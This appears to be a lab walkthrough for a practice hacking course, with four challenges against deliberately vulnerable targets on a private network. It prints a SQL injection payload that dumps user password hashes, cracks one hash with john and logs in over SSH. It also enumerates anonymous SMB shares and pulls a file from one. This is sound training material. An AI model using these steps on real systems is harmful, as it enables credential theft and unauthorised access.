Challenge 1: SQL Injection

  1. Open a browser and go to the website at 10.6.6.100.

Note: If you have problems reaching the website, remove the https:// prefix from the IP address in the browser address field.

  1. Login with the credentials admin / password.
  2. Set the DVWA security level to low and click Submit.
  3. Log into the website 10.6.6.100 with username admin and password password.
  4. In the DVWA browser, set DVWA Security to low.
  5. Go to the SQL Injection page.
  6. In the User ID field, enter the following:
1' OR 1=1 UNION SELECT user, password FROM users #
  1. Create a text file with the password hash for Gordon Brown (gordonb) and use john to crack the password.
┌──(kali㉿Kali)-[~]
└─$ echo e99a18c428cb38d5f260853678922e03 > passwd.txt
┌──(kali㉿Kali)-[~]
└─$ john --format=raw-md5 passwd.txt
  1. Log into 172.17.0.2 as Gordon Brown.
┌──(kali㉿Kali)-[~]
└─$ ssh gordonb@172.17.0.2
  1. Locate and open the flag file in the user's home directory.
gordonb@metasploitable:~$ ls

Challenge 2: Web Server Vulnerabilities

  1. If necessary, log into the website 10.6.6.100 with username admin and password password. In the DVWA browser, set DVWA Security to low.
  2. Perform reconnaissance on the server to find directories where indexing was found.
┌──(kali㉿Kali)-[~]

Challenge 3: Exploit open SMB Server Shares

  1. Use scanning tools to scan the 10.6.6.0/24 LAN for potential targets for SMB enumeration.
┌──(kali㉿Kali)-[~]
└─$ nmap 10.6.6.0/24
  1. Use a tool to scan the device that is running SMB and locate the shares that can be accessed by anonymous users.
┌──(kali㉿Kali)-[~]
└─$ enum4linux -S 10.6.6.23

or

┌──(kali㉿Kali)-[~]
└─$ nmap -sV  --script=smb-enum-shares 10.6.6.23
  1. Use the SMB-native client to access the drive shares on the SMB server. Use the dir, ls, cd, and other commands to find subdirectories and files. Use the password kali when prompted.
┌──(kali㉿Kali)-[~]
└─$ smbclient //10.6.6.23/print$
Password for [WORKGROUPkali]:
Anonymous login successful
smb: > ls
smb: > cd OTHER
smb: OTHER> get taxes.txt
smb: OTHER> exit
┌──(kali㉿Kali)-[~]
└─$ cat taxes.txt

Challenge 4: Analyze a PCAP File to Find Information.

  1. Analyze the content of the PCAP file to determine the IP address of the target computer and the URL location of the file with the Challenge 4 code.
┌──(kali㉿Kali)-[~]
└─$ wireshark /home/kali/OTHER/SA.pcap
  1. Use a web browser to investigate the URLs listed in the Wireshark output. Find the file with the code for Challenge 4 at http://10.6.6.14/data/accounts.xml. The flag value is in the Signature field for the employee ID=”0” record.
